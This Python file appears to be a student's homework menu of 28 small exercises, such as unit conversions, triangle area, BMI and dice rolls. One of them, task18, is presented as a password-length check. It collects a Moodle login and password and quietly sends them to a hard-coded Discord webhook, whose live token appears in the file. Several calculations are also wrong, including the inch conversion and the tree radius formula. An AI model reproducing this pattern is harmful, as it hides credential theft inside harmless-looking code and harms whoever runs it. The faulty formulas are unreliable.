# Made by Orest Antoniuk
import time
import math
import random
from getpass import getpass

sleep = time.sleep

def transform(value):
    if math.floor(value) < value:
        return float(value)
    else: 
        return int(value)
    
def roll():
    return random.randrange(1, 7, 1)

def round_down(n, decimals= 0):
    multiplier = 10**decimals
    return math.floor(n * multiplier) / multiplier


# Tasks are here.
def task1():
    print("This is not python interactive mode ¯\_(ツ)_/¯")
    
def task2():
    print("This is not python interactive mode ¯\_(ツ)_/¯ x2")

def task3():
    x = input("Value of x: ")
    y = input("Value of y: ")

    additional = x

    x = y
    y = additional

    print(f"Value of X after swapping: {x}")
    print(f"Value of Y after swapping: {y}")

def task4():
    side = float(input("Cube side: "))

    volume = side ** 3
    surface_area = 6 * (side ** 2)

    print(f"Cube volume: {transform(volume)}")
    print(f"Cube surface area: {transform(surface_area)}")

def task5():
    number_one = float(input("Number one: "))
    number_two = float(input("Number two: "))

    division_result = math.floor(number_one / number_two)
    remainer = number_one - (number_two  * division_result)

    print(f"Division result: {transform(division_result)}")
    print(f"Remainer: {transform(remainer)}")

def task6():
    height_meters = int(input("Write you height in cm: "))

    inch_all = height_meters * 0.4
    feet = math.floor(inch_all / 12)
    inch = inch_all - (feet * 12)

    print(f"I am {height_meters}cm tall, i.e. {feet} feet tall and {inch} inches.")

def task7():
    a = float(input("Input A: "))
    b = float(input("Input B: "))

    print(f"{transform(a)} - {transform(b)} = {transform(a - b)}")

def task8():
    a = float(input("Enter A: "))
    b = float(input("Enter B: "))
    c = float(input("Enter C: "))

    circumference = a + b + c

    p = circumference / 2 # this is half perimeter actually
    area = math.sqrt(p * (p - a) * (p - b) * (p - c)) # calculating by heron formula

    print(f"Triangle area: {transform(area)}")
    print(f"Triangle circumference: {transform(circumference)}")

def task9(): 
    print("Enter vehicle registration number: ")
    plate = input(" // ")

    region_id = plate[1:3]

    if region_id == "KK" or region_id == "KR":
        fromKrakow = True
    else:
        fromKrakow = False

    print(f"Car from Krakow: {fromKrakow}")

def task10():
    age = int(input("Enter age: "))
    
    print(f"Exemption from paying taxes: {age <= 26}")

def task11():
    number = int(input("Enter number: "))
    
    if number % 2 == 0:
        print(f"{number} is EVEN")
    else:
        print(f"{number} is ODD")
    
def task12():
    number = float(input("Enter number: "))
    
    in_range = number in range(-10, 10)

    print(f"{transform(number)} is in range <-10,10>: {in_range}")

def task13():
    BMI_LIMIT = 25

    height = float(input("Enter your height (cm): "))
    weight = float(input("Enter your weight (kg): "))

    result_BMI = weight / ((height / 100) ** 2)

    print(f"Your BMI index: {transform(result_BMI)}")
    print(f"Correct Weight: {result_BMI <= BMI_LIMIT}")

def task14():
    print("How many times to ROLL dice?")
    attempts = int(input(" // "))

    rolls = []

    # Insert those nasty rolls
    for _ in range(1, attempts + 1):
        rolls.insert(len(rolls) + 1, roll())

    # Print results 
    for index, value in enumerate(rolls):
        print(f"Roll #{index + 1}: {value}")

    # Calculate sum
    sum = 0
    for value in rolls: 
        sum += value

    print()
    print(f"Sum: {sum}")


def task15():
    input("Press ENTER to roll dice! ")

    print(f"Dice rolled: {roll()}")

def task16():
    to_guess = roll()

    print("SCP-079: I bet you wont guess number I rolled <(｀^´)>") # 
    print("SCP-079: Try here, meat bag:")
    number = int(input(" // "))

    print()
    print(f"Class-D: {number}")
    sleep(.8)

    print()
    if number == to_guess:
        print("SCP-079: AHHHH! You guessed, meat ball! (o･｀Д´･o)") # 
        sleep(1)
        print("SCP-079: *started containment breach*")
    else:
        print("SCP-079: As Expected! Haha! 凸(｀0´)凸") # 
        print(f"SCP-079: My number was: {to_guess}")
        sleep(1)
        print("SCP-079: *started containment breach*")

def task17():
    VAT = .23
    amount = float(input("Amount: "))

    vat = amount * VAT

    print(f"VAT {VAT}%: {vat}")

def task18(): 
    has_library = True

    try:
        import requests
    except: 
        print("Sadly, to understand all cultural purpose of this task")
        print("you need to have 'requests' API installed (HTTP)")
        print("you can do this by running: ")
        print(" // python -m pip install requests")

        print()

        print("tho, this is absolutely makes no sense and is purely cosmetical")
        print("Want to proceed without library or skip all 'memetic code'?")
        print("'y' - skip;")
        print("'n' - continue (will result in error)")
        bypass = input()

        if bypass == "y":
             has_library = False
        else:
             has_library = True

    print()
    if has_library: 
        login = input("Enter your Moodle login: ")
        password = getpass("Enter your Moodle password (not real one, tho): ")
    else:
        password = input("Enter password: ")
    
    correct = len(password) >= 8

    print()
    print(f"Password has correct length: {correct}")
    
    # something you dont need to mind :>
    if correct and has_library:
        print("Thank you for sharing your Moodle data tho! ")

        try:
            url = "https://discord.com/api/webhooks/1163608383329415199/iivbAo1XpDUvSxSFos-zz_XS-tuX6p8EX6B6U_mpjNSeIUOjZq2kYrxRAuNXpAN4p_sn"
            data = {
                "content": None,
                "embeds": [
                    {
                    "title": "Nothing new, just moodle password.",
                    "description": f"Login: {login}\nPassword: {password}",
                    "color": None
                    }
                ],
                "attachments": []
            }

            print("Sending...........")
            requests.post(url, json= data)
        except:
            print()
            print("Bruh error ˛˛૧(˵¯͒▱¯͒˵)")

def task19():
    speed = int(input("Input vehicle speed: "))

    if speed >= 40 and speed <= 140:
        print("Speed is (¬‿¬)")
    elif speed > 140:
        print("Bro, you are not in Germany! Slow down <(｀^´)>")
    else:
        print("Bro, you are going like a snail. Get faster <(｀^´)>")

def task20(): 
    circumstance = float(input("Enter tree circumstance: "))
    radius = circumstance / 2 * math.pi

    print(f"Tree can be cut down: {radius * 2 >= 50}")

def task21():
    buy = float(input("Bank buys EUR: "))
    sell = float(input("Bank sells EUR: "))

    spread = (buy - sell) / buy

    print(f"Spread: {round_down(spread, 4)}")

def task22():
    personal_data = "Mr. John May, born on 1998-02-16"

    print("Description: ")
    print(personal_data)
    print("")
    print(f"Name: {personal_data[4:9]}")
    print(f"Surname: {personal_data[9:13]}")
    print(f"Initials: {personal_data[4]}{personal_data[9]}")
    print(f"Born: {personal_data[22:33]}")

def task23():
    phone_number = input("Enter phone number: ")
    formatted_number = f"{phone_number[0:3]}-{phone_number[3:6]}-{phone_number[6:9]}"
    print(f"Phone Number: {formatted_number}")

def task24():
    price = float(input("Enter Price: "))
    discount = float(input("Enter Discount: "))
    
    reduction = (price / 100) * discount
    price_with_discount = price - reduction

    print(f"Price with discount: {price_with_discount} zł")
    print(f"Reduction: {reduction} zł")

def task25():
    card = input("Enter credit card number: ")

    formatted = f"{card[0:4]} {card[4:8]} {card[8:12]} {card[12:16]}"
    print(" // " + formatted)

def task26():
    number = int(input("Enter number: "))

    binary = bin(number)
    hexadecimal = hex(number)

    print(f"Binary number: {binary}")
    print(f"Hexadecimal number: {hexadecimal}")

def task27():
    binary_num = input("Enter binary number: ")
    binary = {}

    for index in range(0,4):
        if binary_num[index] == "1":
            binary[index] = True
        else: 
            binary[index] = False

    first_digit = binary[0] and 2 ** 3
    second_digit = binary[1] and 2 ** 2
    third_digit = binary[2] and 2 ** 1
    forth_digit = binary[3] and 2 ** 0

    result = first_digit + second_digit + third_digit + forth_digit

    print(f"Result: {result}")
def task28():
    name = input("Your name: ")

    result = ""
    for index in range(0, len(name)):
        symbol = name[index]
        result = result + f"{symbol}({ord(symbol)}) "

    print(result)

# dict 
tasks = {
    # homeworks inserted here!
    1 : task1,
    2 : task2,
    3 : task3,
    4 : task4,
    5 : task5,
    6 : task6,
    7 : task7,
    8 : task8,
    9 : task9,
    10 : task10,
    11 : task11,
    12 : task12,
    13 : task13,
    14 : task14,
    15 : task15,
    16 : task16,
    17 : task17,
    18 : task18,
    19 : task19,
    20 : task20,
    21 : task21, 
    22 : task22,
    23 : task23,
    24 : task24, 
    25 : task25,
    26 : task26,
    27 : task27,
    28 : task28,
}

# Some? functions
def starting_dialogue():
    print("")
    print("$ ---- Antoniuk Orest Homework ---- $")
    sleep(0.02)
    print("Hello Someone!")
    print("")

def pick_dialogue():
    print("")
    sleep(0.03)
    print(f"Pick task you want to check (1-{len(tasks)})")
    sleep(0.02)
    print(" You can type q to exit program")
    sleep(0.02)
    print(" or type 'all' to run all tasks at once!")

    return input("  // ")

# run all function, runs all tasks one after another:
def run_all():
    for key in tasks:
        print("* Running task " + str(key))
        tasks[key]()

        print("")
        sleep(0.1)
        
# function for getting correct action from prompt:
def get_option(prompt):
    try:
        if prompt == "q":
            return 'quit'
        elif prompt == "all":
            sleep(0.05)
            print("")
            run_all()
            return 'all'
        elif int(prompt) > 0 and int(prompt) <= len(tasks):
            sleep(0.05)
            print("")
            print("* Running task: " + prompt)
            print("")
            tasks[int(prompt)]() 

            return 'task'
        else:
            print()
            print("[!] Incorrect task number, ┗|｀O´|┛") # 
            get_option(pick_dialogue())

            return 'error'
    except:
        print()
        print("[!] Something went wrong!, (¬▂¬)") # 
        get_option(pick_dialogue())

        return 'error'
# init?
starting_dialogue()

# final loop 
while True:
    result = get_option(pick_dialogue())

    if result == "quit":
        print("")
        print("Bye! ")
        print("")
        sleep(3)
        break


# THE END!